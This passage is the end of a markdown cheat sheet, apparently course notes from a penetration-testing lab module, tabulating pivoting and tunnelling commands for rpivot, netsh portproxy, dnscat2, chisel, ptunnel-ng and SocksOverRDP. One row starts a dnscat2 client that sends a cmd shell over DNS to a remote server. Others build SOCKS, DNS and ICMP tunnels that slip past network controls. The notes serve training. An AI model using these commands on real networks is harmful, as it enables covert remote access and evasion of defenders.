+| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`                                                                                                                                     | Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).                                                                                                                                               |
+| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                                                                                                                                                         | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.                                                                                                                                                                |
+| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`                                                                                                                                                   | Used to run the rpivot client (client.py) to connect to the specified rpivot server on the appropriate port.                                                                                                                                                            |
+| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`                                                                                                                                                          | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.                                                                                                                                          |
+| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.                                                                                                                                                              |
+| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`                                                                                 | Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.                                                                                   |
+| `netsh.exe interface portproxy show v4tov4`                                                                                                                                                                        | Windows-based command used to view the configurations of a portproxy rule called v4tov4.                                                                                                                                                                                |
+| `git clone https://github.com/iagox86/dnscat2.git`                                                                                                                                                                 | Clones the dnscat2 project GitHub repository.                                                                                                                                                                                                                           |
+| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`                                                                                                                        | Used to start the dnscat2.rb server running on the specified IP address, port (53) & using the domain inlanefreight.local with the no-cache option enabled.                                                                                                             |
+| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                                                                                                                  | Clones the dnscat2-powershell project Github repository.                                                                                                                                                                                                                |
+| `Import-Module dnscat2.ps1`                                                                                                                                                                                        | PowerShell command used to import the dnscat2.ps1 tool.                                                                                                                                                                                                                 |
+| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`                                                                                     | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).                                                                          |
+| `dnscat2> ?`                                                                                                                                                                                                       | Used to list dnscat2 options.                                                                                                                                                                                                                                           |
+| `dnscat2> window -i 1`                                                                                                                                                                                             | Used to interact with an established dnscat2 session.                                                                                                                                                                                                                   |
+| `./chisel server -v -p 1234 --socks5`                                                                                                                                                                              | Used to start a chisel server in verbose mode listening on port 1234 using SOCKS version 5.                                                                                                                                                                             |
+| `./chisel client -v 10.129.202.64:1234 socks`                                                                                                                                                                      | Used to connect to a chisel server at the specified IP address & port using socks                                                                                                                                                                                       |
+| `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                                                                                | Clones the ptunnel-ng project GitHub repository.                                                                                                                                                                                                                        |
+| `sudo ./autogen.sh`                                                                                                                                                                                                | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.                                                                                                                                                                                 |
+| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                                                                                                                                                                           | Used to start the ptunnel-ng server on the specified IP address (-r) and corresponding port (-R22).                                                                                                                                                                     |
+| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`                                                                                                                                                    | Used to connect to a specified ptunnel-ng server through local port 2222 (-l2222).                                                                                                                                                                                      |
+| `ssh -p2222 -lubuntu 127.0.0.1`                                                                                                                                                                                    | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.                                                                                                                                       |
+| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                                                                                                             | Windows-based command used to register the SocksOverRDP-PLugin.dll.                                                                                                                                                                                                     |
+| `netstat -antb \| findstr 1080`                                                                                                                                                                                    | Windows-based command used to list TCP network connections listening on port 1080.                                                                                                                                                                                      |
+
+### Completion
+
+[Link of Completion](https://academy.hackthebox.com/achievement/713396/158)
